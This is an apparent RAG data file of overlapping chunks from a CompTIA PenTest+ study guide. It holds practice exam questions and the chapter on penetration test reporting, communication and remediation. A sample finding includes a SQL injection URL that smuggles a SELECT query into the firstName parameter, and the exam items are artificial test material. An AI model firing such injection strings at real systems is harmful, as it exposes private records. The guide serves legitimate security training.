accessing the underlying hardware in a shared cloud environment in order to gain information about other virtualized systems running on it? A. A direct‐to‐origin attack B. A watering hole attack C. A side‐channel attack D. An object storage attack 15. Isaac wants to test for insecure S3 storage buckets belonging to his target organization. What process can he use to test for this type of insecure configuration? A. Navigate to the bucket's URL using a web browser. B. Use APKX to automatically validate known buckets by name. C. Use a fuzzer to generate bucket names and test them using the fuzzer's testing capability. D. Conduct a direct‐to‐origin attack to find the original bucket source URL. 16. Jocelyn wants to conduct a credential harvesting attack against an organization. What technique is she most likely to employ to accomplish the attack? A. Vulnerability scanning B. Capturing data from other systems on the same physical host C. Sending a phishing email D. Using an SDK to access service configuration data 17. Simone has been asked to check for IPMI interfaces on servers at her target organization. Where is she most likely to find IPMI interfaces to probe? A. In the organization's DMZ B. In a private data center VLAN C. In the organization's workstation VLAN D. On the organization's Wi‐Fi network 18. Selah wants to use a brute‐force attack against the SSH service provided by one of her targets. Which of the following tools is not designed to brute‐force services like this? A. Patator B. Hydra C. Medusa D. Minotaur 19. After compromising a remote host,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	access service configuration data 17. Simone has been asked to check for IPMI interfaces on servers at her target organization. Where is she most likely to find IPMI interfaces to probe? A. In the organization's DMZ B. In a private data center VLAN C. In the organization's workstation VLAN D. On the organization's Wi‐Fi network 18. Selah wants to use a brute‐force attack against the SSH service provided by one of her targets. Which of the following tools is not designed to brute‐force services like this? A. Patator B. Hydra C. Medusa D. Minotaur 19. After compromising a remote host, Cameron uses SSH to connect to port 4444 from his penetration testing workstation. What type of remote shell has he set up? A. A reverse shell B. A root shell C. A bind shell D. A blind shell 20. Jim wants to crack the hashes from a password file he recovered during a penetration test. Which of the following methods will typically be fastest? A. John the Ripper B. Rainbow Road C. Hashcat D. CeWL Chapter 11 Reporting and Communication THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 1: Engagement Management 1.2 Explain collaboration and communication activities. Peer review Stakeholder alignment Root cause analysis Escalation path Secure distribution Articulation of risk, severity, and impact Goal reprioritization Business impact analysis Client acceptance 1.4 Explain the components of a penetration test report. Format alignment Documentation specifications Risk scoring Definitions Report components Executive summary Methodology Detailed findings Attack narrative Recommendations Remediation guidance Test limitations and assumptions Reporting considerations Legal Ethical Quality control (QC) Artificial intelligence (AI) 1.5 Given a scenario, analyze the findings and recommend the appropriate remediation within a report. Technical controls System hardening Sanitize user input/parameterize queries Multifactor authentication Encryption Process‐level remediation Patch management Key rotation Certificate management Secrets management solution Network segmentation Infrastructure security controls Administrative controls Role‐based access control Secure software development life cycle Minimum password requirements Policies and procedures Operational controls Job rotation Time‐of‐day restrictions Mandatory vacations User training Physical controls Access control vestibule Biometric controls Video surveillance Domain 5: Post‐exploitation and Lateral Movement 5.4 Explain cleanup and restoration activities. Remove persistence mechanisms Revert configuration changes Remove tester‐created credentials Remove tools Spin down infrastructure Preserve artifacts Secure data destruction What is the purpose of a penetration test? If you look back to Chapter 1, “Penetration Testing,” you'll find a tidy definition that describes how organizations employ the services of white‐hat hackers to evaluate their security defenses. One phrase in particular from that chapter is particularly important. It said that penetration tests are “the most effective way for an organization to gain a complete picture of its security vulnerability.” After you completed Chapter 1, you made your way through 9 more chapters that helped you understand how to conduct a penetration test. You learned about the penetration testing process, the tools and techniques used by penetration testers, and the vulnerabilities that testers seek to exploit. These are very important concepts, because they provide testers with the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	employ the services of white‐hat hackers to evaluate their security defenses. One phrase in particular from that chapter is particularly important. It said that penetration tests are “the most effective way for an organization to gain a complete picture of its security vulnerability.” After you completed Chapter 1, you made your way through 9 more chapters that helped you understand how to conduct a penetration test. You learned about the penetration testing process, the tools and techniques used by penetration testers, and the vulnerabilities that testers seek to exploit. These are very important concepts, because they provide testers with the tools necessary to develop that picture of an organization's security vulnerability. However, that picture is only useful to the organization if the penetration testers are able to effectively communicate the results of the testing to management and technical staff. In this chapter, we turn our attention to that crucial final phase of a penetration test: reporting and communicating our results. Real World Scenario Report Writing Throughout this book, you've been following along with the penetration test of a fictional company: MCDS, LLC. You've conducted reconnaissance against this company's IT environment, probed for vulnerabilities, and discovered deficiencies that may allow an attacker to gain access to information and systems. The penetration test was conducted in response to a real intrusion at MCDS, so you will also be asked to incorporate the results of computer forensics in your report. Computer forensics is the act of gathering digital evidence from computer systems to support an investigation. At the conclusion of this chapter, you will complete two lab activities that tie together the work you've done as you've worked your way through this book. You'll be asked to develop a prioritized set of remediation strategies that MCDS should follow to improve its security and then to document your findings and recommendations in a written report. As you read this chapter, keep this in mind. Think about the remediation strategies that you will suggest and the ways that you might communicate that advice to both senior management and technical leaders. You may find it helpful to look back through the book and reread the scenarios at the beginning of each chapter to refresh yourself before reading the content in this chapter. The Importance of Collaboration and Communication Communication is the lifeblood of a penetration test. Establishing and maintaining open lines of communication during all phases of a test helps penetration testers ensure that they are remaining within the scope of the rules of engagement, that they are meeting client expectations, and that they are maintaining situational awareness of the client's business context. For example, if a client experiences an unexpected surge in business, the penetration testers should be aware of that activity, since they may need to adjust the test timing or parameters to perform deconfliction between testing and business activities. It is crucial that penetration testers understand who the stakeholders are for their work and then ensure that they remain aligned with those stakeholder
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of a test helps penetration testers ensure that they are remaining within the scope of the rules of engagement, that they are meeting client expectations, and that they are maintaining situational awareness of the client's business context. For example, if a client experiences an unexpected surge in business, the penetration testers should be aware of that activity, since they may need to adjust the test timing or parameters to perform deconfliction between testing and business activities. It is crucial that penetration testers understand who the stakeholders are for their work and then ensure that they remain aligned with those stakeholder expectations throughout the engagement. Open lines of communication also help avoid and/or mitigate any issues that might arise during the penetration test. If a test begins to interfere with business operations, the client and testing team may work together to deescalate the situation, allowing the test to complete its objectives while minimizing the impact on operations. Communication channels may also provide a way for the team to identify whether findings are false positives by obtaining additional information from internal and external experts about the configuration and use of systems and applications. That information may then help determine whether findings are correct or whether they represent false positives. Similarly, if testers identify a possible attack in progress or evidence of a past attack, they may use communication channels to report possible criminal activity. Defining an Escalation Path Penetration testers should clearly define their communication and escalation paths during the planning stages of an engagement. It's natural for technologists throughout the organization to be curious about interim results, especially if they are responsible for managing systems and applications that are within the scope of the test. When a communication path is defined in advance, this provides testers with an easy answer to requests for information: “Our contract requires us to keep the results confidential until we release our final report to management, except under very specific circumstances.” This communication path should include contacts that will be used in different circumstances: The primary contact, who is responsible for the day‐to‐day administration of the penetration test The technical contact, who can handle any technology issues or questions that arise during the test The emergency contact, such as a 24‐hour security operations center (SOC) that may be used in the event of an emergency In addition to communicating about results, penetration testers should establish a regular rhythm of communication with their clients to provide periodic status updates. One common way to achieve this is to set up a standing meeting with key stakeholders, where the penetration testers and clients discuss outstanding issues and provide updates on the progress of the test. The frequency of these meetings may vary depending on the length of the engagement. For example, if an engagement is planned to last only a week or two, the team might convene a daily morning stand‐up meeting to briefly discuss progress and issues. If an engagement will last a month or longer, those meetings
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	regular rhythm of communication with their clients to provide periodic status updates. One common way to achieve this is to set up a standing meeting with key stakeholders, where the penetration testers and clients discuss outstanding issues and provide updates on the progress of the test. The frequency of these meetings may vary depending on the length of the engagement. For example, if an engagement is planned to last only a week or two, the team might convene a daily morning stand‐up meeting to briefly discuss progress and issues. If an engagement will last a month or longer, those meetings might occur only once a week, with other communication paths set up to handle tactical issues that might arise between meetings. Communication Triggers In addition to clearly defining the communication path between penetration testers and their clients, the planning phase of a test should include a clearly outlined list of communication triggers. These are the circumstances that merit immediate communication to management because they might come before regularly scheduled communications. The following list includes common penetration testing communication triggers: Completion of a Testing Stage The penetration testing statement of work should include concrete milestones that indicate the completion of one stage of testing and mark the beginning of the next stage. The completion of a test stage should serve as a trigger for communicating periodic status updates to management. Discovery of a Critical Finding If the penetration test identifies a critical issue with the security of the client's environment, the testers should not wait for the delivery of their final report to communicate this issue to management. Leaving a critical vulnerability unaddressed may put the organization at an unacceptable level of risk and result in a compromise. Penetration testers who discover and validate the presence of a critical issue should follow the procedures outlined in the statement of work to immediately notify management of the issue, even if this notification reduces the degree of penetration that the testers are able to achieve during the test. Discovery of Indicators of Prior Compromise Penetration testers follow paths of activity that might also be attractive to real‐world attackers. This puts them in situations where they are likely to discover evidence left behind by real attackers who compromised a system. When penetration testers discover indicators of an ongoing or past compromise, they should immediately inform management and recommend that the organization activate its cybersecurity incident response process. In almost all circumstances, penetration testers should communicate with management when they complete a testing stage, identify a critical finding, or discover indicators of a real‐world compromise. The statement of work may also include additional communication triggers based on the unique circumstances of the penetration test. Goal Reprioritization There's a common saying among military planners: “No plan survives first contact with the enemy.” In the realm of warfare, this means that the dynamic circumstances of the battlefield often require rapid shifts in plans that may have been in development for years. The same concept is true in
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	incident response process. In almost all circumstances, penetration testers should communicate with management when they complete a testing stage, identify a critical finding, or discover indicators of a real‐world compromise. The statement of work may also include additional communication triggers based on the unique circumstances of the penetration test. Goal Reprioritization There's a common saying among military planners: “No plan survives first contact with the enemy.” In the realm of warfare, this means that the dynamic circumstances of the battlefield often require rapid shifts in plans that may have been in development for years. The same concept is true in the world of penetration testing. As testers conduct their work, they may discover information that causes them to want to reprioritize the goals of the test and perhaps pivot in a new, unforeseen direction. Reprioritizing the goals of a penetration test is an acceptable activity. It's perfectly fine to deviate from the original plan, but this reprioritization requires the input and concurrence of stakeholders. Remember, when you first embarked on a penetration test, you sought agreement from many stakeholders on the rules of engagement and the priorities for the test. If you wish to change those rules or priorities, you should seek concurrence from that same group of stakeholders before unilaterally changing the parameters of the penetration test. Recommending Mitigation Strategies As you worked your way through the penetration test, you developed most of the material that you will need to include in your final report. However, one extremely important step remains before you can complete your documentation: recommending mitigation strategies. Remember, the whole point of a penetration test is to discover weaknesses in an organization's security posture so that they can be corrected. Penetration testers who successfully gain access to an organization's computing environment understand the flaws they exploited in more detail than anyone else. This makes penetration testers uniquely suited to recommend ways to remediate those flaws. They simply need to ask themselves this: What controls would have prevented me from carrying out the activities that allowed me to gain access to this system? Security professionals are often quick to jump to technological solutions, but penetration testers should consider the full range of potential remediations for any flaw they discover. These fit into four categories: Technical controls provide effective defenses against many security threats. For example, an organization might implement email content filtering to block inbound messages that appear to come from internal sources without proper authentication. They may also filter out messages containing high‐risk keywords or that come from known malicious sources. Common technical controls include system hardening, user input sanitization, query parameterization, multifactor authentication, encryption, process‐level remediation, patch management, encryption key rotation, certificate and secrets management, network segmentation, and infrastructure security controls. Administrative controls are process‐driven efforts to improve security. Common administrative controls include the use of role‐based access control systems, the implementation of a secure software development life cycle, the enforcement of policies and procedures, and minimum password requirements. Operational controls are practices that improve
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	appear to come from internal sources without proper authentication. They may also filter out messages containing high‐risk keywords or that come from known malicious sources. Common technical controls include system hardening, user input sanitization, query parameterization, multifactor authentication, encryption, process‐level remediation, patch management, encryption key rotation, certificate and secrets management, network segmentation, and infrastructure security controls. Administrative controls are process‐driven efforts to improve security. Common administrative controls include the use of role‐based access control systems, the implementation of a secure software development life cycle, the enforcement of policies and procedures, and minimum password requirements. Operational controls are practices that improve personnel security by implementing standard procedures. Common operational controls include job rotation, login time‐of‐day restrictions, mandatory vacations, and user training. Physical controls prevent intruders from gaining physical access to a facility. Commonly used physical controls include the use of access control vestibules, biometric controls, and video surveillance systems. In fact, robust defense‐in‐depth solutions to security issues often include overlapping controls from more than one of these categories. For example, an organization seeking to address the risk of fraudulent wire transfer requests might opt to implement an employee awareness campaign, a new business process for wire transfers, and email content filtering at the same time to effectively mitigate this risk. Let's take a look at six common findings that might arise during penetration tests and commonly used mitigation strategies for each: Shared local administrator credentials Weak password complexity Plain‐text passwords No multifactor authentication SQL injection Unnecessary open services The next six sections of this chapter discuss each of these findings in detail. Finding: Shared Local Administrator Credentials Shared accounts are almost always a bad idea. When more than one individual shares the password to an account, the organization suffers from an inevitable lack of accountability. Anyone taking an action using a shared account can later deny responsibility and credibly claim that someone else with access to the account might have performed the activity in question. Shared administrator accounts pose an even greater risk to the organization than shared user accounts because of their elevated privileges. However, the design of operating systems and applications often requires the use of a built‐in administrator account that automatically has superuser privileges. IT teams often use a single default password for all of these accounts to simplify administration. Penetration testers and attackers know this and often key in on those accounts as targets for attack. Fortunately, solutions are available to address this problem. Organizations should randomize the passwords of administrator accounts, setting them to strong, complex passwords that are unique on each system. They may then use a password management tool to track all those passwords. In an ideal situation, no human being would have knowledge of those passwords. They may be available for emergency use through the password management tool, but the tool should be implemented in a way that administrators may gain emergency access to systems using the password without learning the password themselves. Additionally, the tool should change passwords to a new random,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	solutions are available to address this problem. Organizations should randomize the passwords of administrator accounts, setting them to strong, complex passwords that are unique on each system. They may then use a password management tool to track all those passwords. In an ideal situation, no human being would have knowledge of those passwords. They may be available for emergency use through the password management tool, but the tool should be implemented in a way that administrators may gain emergency access to systems using the password without learning the password themselves. Additionally, the tool should change passwords to a new random, complex value immediately after their use or disclosure. The Windows Local Administrator Password Solution (LAPS) is a tool that manages administrative credentials for organizations. It stores and manages passwords in Active Directory, where they may be directly tied to computer accounts. Finding: Weak Password Complexity Surprisingly, many organizations still fall victim to attacks that exploit the ability of users to create weak passwords. Passwords that don't use complexity requirements are easy to crack using brute‐force attacks, either against live systems or against a stolen file containing hashed passwords. Remediating this vulnerability is straightforward. Organizations that rely on passwords for authentication should set technical policies that specify minimum password requirements governing the length and composition of passwords. Any time a user is provided with the ability to set or change a password, that password should pass through a password filter to verify that it meets the organization's current complexity requirements. Real World Scenario Password Complexity at Target Requiring complex passwords is a time‐tested security practice, and you would think that every organization already meets this bare minimum standard for security. But you'd be wrong. Target Corporation suffered a serious data breach in 2013 that involved the disclosure of over 40 million credit card numbers used by consumers at its retail stores across the United States. In the aftermath of that breach, Target hired Verizon to conduct a penetration test of its systems to help root out the vulnerabilities that allowed the attack to succeed. Cybersecurity journalist Brian Krebs gained access to a copy of the report from that test, which read, in part: While Target has a password policy, the Verizon security consultants discovered that it was not being followed. The Verizon consultants discovered a file containing valid network credentials being stored on several servers. The Verizon consultants also discovered systems and services utilizing either weak or default passwords. Utilizing these weak passwords the consultants were able to instantly gain access to the affected systems. The penetration testers were able to crack 86 percent of the general user passwords on Target's network, along with 34 percent of administrator accounts. Many passwords contained a base word with characters before or after it, making cracking simple. These were the most common base words: target sto$res train t@rget summer crsmgr winter Finding: Plain‐Text Passwords Another common password‐related security issue that appears often during penetration tests is the storage of passwords in plain text on
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and services utilizing either weak or default passwords. Utilizing these weak passwords the consultants were able to instantly gain access to the affected systems. The penetration testers were able to crack 86 percent of the general user passwords on Target's network, along with 34 percent of administrator accounts. Many passwords contained a base word with characters before or after it, making cracking simple. These were the most common base words: target sto$res train t@rget summer crsmgr winter Finding: Plain‐Text Passwords Another common password‐related security issue that appears often during penetration tests is the storage of passwords in plain text on a server. This commonly occurs when an organization has a website that allows users to create accounts protected by a password. For ease of implementation, the developer might simply write those passwords to a file or database where they are easily accessible. The disadvantage to this approach is that the passwords are also easily accessible to an attacker who gains access to a system. You might wonder why that's a big deal—after all, the attacker has already compromised the system at this point. That's true, but the real risk lies in the fact that users are creatures of habit, and they reuse the same passwords across multiple systems and domains for convenience. A user password stolen from a website's password file might be the same password that protects sensitive information stored in the user's email account or safeguards their bank account. The solution to this issue is to always store passwords in encrypted or hashed form. This prevents an attacker who gains access to the server from easily accessing all the passwords stored on that server. Finding: No Multifactor Authentication The two common findings that we've discussed so far both revolve around ways that organizations might implement password authentication in an insecure manner. However, the very reliance on passwords often constitutes a serious security risk. Passwords are a knowledge‐based authentication mechanism, and as such, they may be easily learned by another person. Organizations seeking to protect sensitive information and critical resources should implement multifactor authentication for those situations. Multifactor authentication implementations combine two or more authentication mechanisms coming from different authentication categories (or factors). These include the following categories: Something You Know Knowledge‐based authentication approaches rely on some fact that the individual memorizes and keeps secret from other parties. This category includes passwords, PINs, and answers to security questions. Something You Have Physical objects may also be used as authentication mechanisms. These may include authentication tokens carried on keyfobs that generate a one‐time password that must be used at login. Other physical approaches include the use of smartphone apps that request confirmation of a login request, such as the Duo application shown in Figure 11.1. Something You Are Biometric authentication techniques measure some attribute of an individual's physical body. Biometric approaches include fingerprint scans, voiceprint analysis, and facial recognition. FIGURE 11.1 Smartphone‐based multifactor authentication Multifactor authentication systems must combine factors coming from two different categories. For example, an authentication system
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	You Have Physical objects may also be used as authentication mechanisms. These may include authentication tokens carried on keyfobs that generate a one‐time password that must be used at login. Other physical approaches include the use of smartphone apps that request confirmation of a login request, such as the Duo application shown in Figure 11.1. Something You Are Biometric authentication techniques measure some attribute of an individual's physical body. Biometric approaches include fingerprint scans, voiceprint analysis, and facial recognition. FIGURE 11.1 Smartphone‐based multifactor authentication Multifactor authentication systems must combine factors coming from two different categories. For example, an authentication system that uses facial recognition and a PIN combines a “something you are” factor with a “something you know” factor to achieve multifactor authentication. Similarly, a multifactor system might combine a password (something you know) with a smartphone app (something you have). Approaches that combine two techniques from the same factor, such as a password and a PIN, do not qualify as multifactor authentication. Finding: SQL Injection SQL injection vulnerabilities exist in many dynamic web applications and are one of the most common findings in penetration test reports. These vulnerabilities are especially important to remediate because they often allow attackers to read and/or modify the entire contents of the database supporting a web application. CompTIA suggests two techniques for remediating SQL injection vulnerabilities: sanitizing user input (also known as input validation) and parameterizing queries. We discussed SQL injection vulnerabilities, as well as these remediation strategies, in detail in the section “Injection Attacks” in Chapter 5, “Interpreting Vulnerability Scan Results.” Finding: Unnecessary Open Services Penetration testers often discover services that administrators didn't even know were present running on servers. This may occur when unnecessary services are created during an installation and configuration process or when previously used services are no longer needed but nobody disables them. These unnecessary services pose a security risk because they increase the attack surface, providing an attacker with additional avenues to exploit the system. They may also run without the attention of a system administrator, allowing them to become dangerously out‐of‐date and unpatched. The solution to unnecessary services is system hardening. When initially configuring a system, administrators should analyze all the open services on the device and shut down any services that aren't necessary for the proper functioning of the server. They should repeat this process on a periodic basis and reconfigure systems as business needs change. Writing a Penetration Testing Report As you approach the conclusion of a penetration test, it's important to document your work with a written report of your findings and recommended remediation techniques. This report provides management with a remediation road map and serves as an important artifact of the penetration test. It may also serve as documentation that a test was completed, if necessary to meet regulatory requirements. Let's take a look at some report writing and handling best practices. Structuring the Written Report There isn't any universal template that you need to follow when designing a penetration testing report, but
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Writing a Penetration Testing Report As you approach the conclusion of a penetration test, it's important to document your work with a written report of your findings and recommended remediation techniques. This report provides management with a remediation road map and serves as an important artifact of the penetration test. It may also serve as documentation that a test was completed, if necessary to meet regulatory requirements. Let's take a look at some report writing and handling best practices. Structuring the Written Report There isn't any universal template that you need to follow when designing a penetration testing report, but you may choose to align with a format or template provided by your organization. Regardless of whether you begin from a template, it's good practice to structure your report into several important sections. One common structure for penetration testing reports includes the following sections, in order: Executive Summary Methodology Detailed Findings Attack Narrative Recommendations and Remediation Guidance Test Limitations and Assumptions Conclusion Appendix Let's take a look at each of these report sections. Remember that the client is usually right! If your client has documentation specifications that they want you to follow, you should probably follow them if you'd like to work with that client again! Executive Summary The Executive Summary is, by far, the most important section of the report. It is often the only section that many people will read, and it should be written in a manner that conveys all the important conclusions of the report in a clear manner that is understandable to a layperson. The title of this section also describes the audience; it is being written for C‐suite executives, who are not necessarily technologists. Executive Summaries are often shared with senior leaders, board members, and third‐ party stakeholders who are busy and lack technical knowledge. Remember this when writing the Executive Summary. This is not the place to get into the technical details of your penetration testing methodology. Explain what you discovered in plain language and describe the risk to the business in terms that an executive will understand. Keep your Executive Summary concise. Some consultants insist that the Executive Summary be a single page to ensure brevity. This might be a bit too constraining, but it is a good idea to keep the section to just a couple of pages. The Executive Summary is definitely not the place to fluff up your content with extraneous words and descriptions. Just get straight to the bottom line. One other important note: The Executive Summary may be the first section to appear in the written report, but it should be the last section that you write. Creating the rest of the penetration testing report helps you finalize your findings, develop remediation recommendations, and provide a sense of context. Once you've finished that process and have the rest of the report complete, you have the knowledge that you need to prepare a concise summary for an executive audience. Methodology The Methodology section of the report is your
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	with extraneous words and descriptions. Just get straight to the bottom line. One other important note: The Executive Summary may be the first section to appear in the written report, but it should be the last section that you write. Creating the rest of the penetration testing report helps you finalize your findings, develop remediation recommendations, and provide a sense of context. Once you've finished that process and have the rest of the report complete, you have the knowledge that you need to prepare a concise summary for an executive audience. Methodology The Methodology section of the report is your opportunity to get into the nitty‐gritty technical details. Explain the types of testing that you performed, the tools that you used, and the observations that you made. The audience for this section of the report consists of the technical staff and developers who will be reviewing your results and taking actions based on your findings. You want to share enough information to give them confidence in the quality of the test and a strong understanding of the way that you approached your work. Although your Methodology section should get into technical detail, it's not a good idea to include lengthy code listings, scan reports, or other tedious results in this section. You still want the report to be readable, and there's nothing that makes someone put a report down sooner than a big chunk of code. If those elements are important to your report, consider placing them out of the way in an appendix and then simply refer to the appendix in the body of the report. If readers are interested, they then know where to go to find more detailed information, but it's not in the middle of the report, bogging them down. Note‐Taking During the course of a penetration testing engagement, testers should follow a standard process for the ongoing documentation of their work. Although these notes may not directly find their way into the final report, they serve as an important tool during the test itself to make sure that testers don't miss key details, and they serve as a reference when writing the final report. This ongoing documentation may include a combination of both written notes and screenshots. Notes created during a test are likely to contain sensitive information and should be handled appropriately at the end of the engagement according to the project's defined retention and destruction procedures. Detailed Findings The Detailed Findings section is the meat and potatoes of a penetration testing report. This is where you describe the security issues that you discovered during the penetration test. For example, a penetration testing report that discovered a SQL injection vulnerability might include the following information in the Detailed Findings section: Critical: SQL injection vulnerabilities allow the exfiltration of sensitive information from a business‐critical database. The web server located at 10.15.1.1 contains an application named directory.asp that contains a SQL injection vulnerability in the firstName variable. Users exploiting this vulnerability gain access to the backend
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and destruction procedures. Detailed Findings The Detailed Findings section is the meat and potatoes of a penetration testing report. This is where you describe the security issues that you discovered during the penetration test. For example, a penetration testing report that discovered a SQL injection vulnerability might include the following information in the Detailed Findings section: Critical: SQL injection vulnerabilities allow the exfiltration of sensitive information from a business‐critical database. The web server located at 10.15.1.1 contains an application named directory.asp that contains a SQL injection vulnerability in the firstName variable. Users exploiting this vulnerability gain access to the backend database instance “CorporateResources” with administrative privileges. The testers demonstrated the ability to use this vulnerability to gain access to employee Social Security numbers, confidential sales figures, and employee salaries. The risk associated with this vulnerability is somewhat mitigated because the web server is not externally accessible, but it poses a critical risk for insider attacks. To reproduce this risk, visit the following URL: https://10.15.1.1/directory.asp? firstName=test';SELECT%20*%20FROM&20Employees'-We recommend that MCDS immediately remediate this vulnerability by enforcing an input validation policy on the firstName variable in the directory ASP application. The Detailed Findings section should also articulate information about the level of risk raised by each finding. This should include the following: Risk severity rating (drawn from an appropriate reference framework) Risk prioritization (based on the likelihood and impact of the risk) Business impact analysis (based on the organization's specific strategic and operational circumstances) Attack Narrative The Attack Narrative provides a detailed account of the actions taken by the penetration testing team to compromise the organization's security. This section is intended for a technical audience and should include specific details about the vulnerabilities exploited, the tools used, and the impact of the attack. Here, you're telling the story of the attack in a way that would allow another security professional or penetration tester to re‐create your work. Start by describing the initial entry point into the target environment. This might include a phishing email, a web application vulnerability, or a misconfigured system. Describe the steps taken to exploit this vulnerability and escalate privileges within the environment. Next, document the lateral movement within the target environment. This might involve pivoting from one compromised system to another, exploiting additional vulnerabilities, or using stolen credentials to gain further access. Finally, describe the actions taken by the testing team to achieve the objectives of the penetration test. This might include data exfiltration, accessing sensitive information, or demonstrating the potential impact of a ransomware attack. Throughout the Attack Narrative, it is important to clearly document the decisions made by the testing team, the tools used, and the outcomes of each action. This level of detail is critical for the technical staff who will be reviewing the report and taking action based on the findings. Recommendations and Remediation Guidance The Recommendations and Remediation Guidance section of the penetration testing report is where the penetration tester provides actionable insights that the organization can use to address the vulnerabilities uncovered during
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	This might include data exfiltration, accessing sensitive information, or demonstrating the potential impact of a ransomware attack. Throughout the Attack Narrative, it is important to clearly document the decisions made by the testing team, the tools used, and the outcomes of each action. This level of detail is critical for the technical staff who will be reviewing the report and taking action based on the findings. Recommendations and Remediation Guidance The Recommendations and Remediation Guidance section of the penetration testing report is where the penetration tester provides actionable insights that the organization can use to address the vulnerabilities uncovered during the engagement. This section is crucial because it translates the technical findings into practical steps that the organization can implement to reduce its cybersecurity risks. In this part of the report, the penetration tester should prioritize the vulnerabilities discovered, categorizing them by severity and impact on the organization's security posture. The recommendations should be clear and concise, offering both short‐term and long‐term strategies for remediation. For example, if a critical vulnerability is identified, the report might recommend immediate patching or configuration changes, followed by more comprehensive solutions such as revising security policies or enhancing monitoring practices. The guidance provided should also consider the specific context of the organization, including its risk appetite and operational needs. It's not enough to simply list potential fixes; the report should help the organization understand how to integrate these recommendations into their existing processes and infrastructure. This might include suggestions for strengthening user authentication mechanisms, improving network segmentation, or conducting regular security training for employees. By offering tailored, actionable advice, the Recommendations and Remediation Guidance section helps ensure that the findings of the penetration test lead to tangible improvements in the organization's security defenses. This section also serves as a road map for the organization to follow, enabling them to methodically address identified risks and enhance their overall resilience against potential cyberthreats. Test Limitations and Assumptions Every penetration test operates within rules of engagement that can affect the scope and outcomes of the assessment. You should acknowledge these rules and any other limitations and assumptions made during your testing to provide context for the findings and to ensure that the results are interpreted accurately. The Test Limitations and Assumptions section should begin by clearly outlining any constraints that were in place during the engagement. These might include time restrictions, the scope of the systems tested, or any areas that were explicitly excluded from the test. For example, if the penetration test was focused solely on the organization's external network, it's important to clarify that internal vulnerabilities were not assessed. Similarly, if the test was conducted during business hours, the tester may have avoided certain aggressive techniques to minimize disruption, which could limit the discovery of certain vulnerabilities. You should also document any assumptions made during the test. These assumptions might involve the expected behavior of security controls, the assumed level of access granted for testing purposes, or the anticipated responses from system administrators. For instance,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	or any areas that were explicitly excluded from the test. For example, if the penetration test was focused solely on the organization's external network, it's important to clarify that internal vulnerabilities were not assessed. Similarly, if the test was conducted during business hours, the tester may have avoided certain aggressive techniques to minimize disruption, which could limit the discovery of certain vulnerabilities. You should also document any assumptions made during the test. These assumptions might involve the expected behavior of security controls, the assumed level of access granted for testing purposes, or the anticipated responses from system administrators. For instance, the report might assume that certain security patches have been applied or that multifactor authentication is in place for all critical systems. These assumptions shape the testing approach and influence the findings, so they need to be transparently communicated to ensure the client understands the context in which the vulnerabilities were identified. By explicitly stating the limitations and assumptions, this section helps set realistic expectations for the report's readers. It also highlights areas where further testing or assessment may be necessary. Understanding the boundaries within which the penetration test was conducted allows stakeholders to make more informed decisions about the next steps in their security strategy, whether that involves addressing identified issues or expanding the scope of future assessments to cover previously untested areas. Conclusion The Conclusion is your opportunity to wrap things up in a tidy package for the reader. You should summarize your conclusions and make recommendations for future work. For example, if your penetration test scope excluded web application testing, you might recommend conducting that testing in a future engagement. You also may wish to include metrics and measures in your Conclusion that help put the information presented in the report in the context of the organization or a peer group of similar organizations or in a global context. Penetration testing providers who conduct many scans annually often conduct normalization of this information to produce an index that summarizes the organization's level of risk in a risk score. The Conclusion is also a good place to compare the risk ratings identified in the report with the organization's risk appetite. Remember, it's not reasonable to expect that any organization will address every single risk that surfaces in a penetration test or other security assessment. Rather, management must make risk‐informed decisions about where they will apply their limited remediation resources based on the nature of each risk rating and the organization's risk tolerance. A risk that might threaten the existence of one organization might be an acceptable risk for a different organization operating in a different business context. Finally, the Conclusion should identify common themes or root causes identified during the test that may help the organization improve its security practices. This may include common vulnerabilities, best practices that aren't being followed, and similar observations. Rather than merely addressing the symptoms of security weaknesses, root cause analysis seeks to identify the underlying reasons why these vulnerabilities exist in the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	resources based on the nature of each risk rating and the organization's risk tolerance. A risk that might threaten the existence of one organization might be an acceptable risk for a different organization operating in a different business context. Finally, the Conclusion should identify common themes or root causes identified during the test that may help the organization improve its security practices. This may include common vulnerabilities, best practices that aren't being followed, and similar observations. Rather than merely addressing the symptoms of security weaknesses, root cause analysis seeks to identify the underlying reasons why these vulnerabilities exist in the first place. By doing so, the organization can take more effective, long‐term actions to prevent similar issues from arising in the future. For instance, if multiple vulnerabilities stem from poor software development practices, the report might recommend revising the development life cycle to include more rigorous security checks, training for developers on secure coding practices, or adopting a DevSecOps approach. Root cause analysis also helps in prioritizing remediation efforts by pinpointing the most significant contributors to the organization's security risks. Addressing these root causes not only mitigates the immediate risks identified during the penetration test but also strengthens the organization's overall security posture, reducing the likelihood of future vulnerabilities. By incorporating root cause analysis into the conclusion, the penetration testing report does more than just document the results of a single test; it provides strategic insights that can drive meaningful and lasting improvements in the organization's cybersecurity practices. Appendix Earlier, we mentioned that the main body of the report is not an appropriate place to include lengthy code listings, scan reports, or other tedious results. If you find it helpful to include that type of information, an appendix or set of appendices is the appropriate way to do so. Other sections of the report may refer to one or more appendices, and readers interested in more detail may review the information there. If you would like to include definitions of technical terms or client‐specific terms that you used in your report, you may also wish to include a glossary as an appendix. That glossary should define any terms not known to the typical reader. Reporting Considerations When preparing a penetration testing report, it's essential to consider several critical factors that extend beyond the technical findings and recommendations. The way in which a report is crafted, reviewed, and delivered can have significant legal, ethical, and operational implications. Legal Considerations Penetration testing often 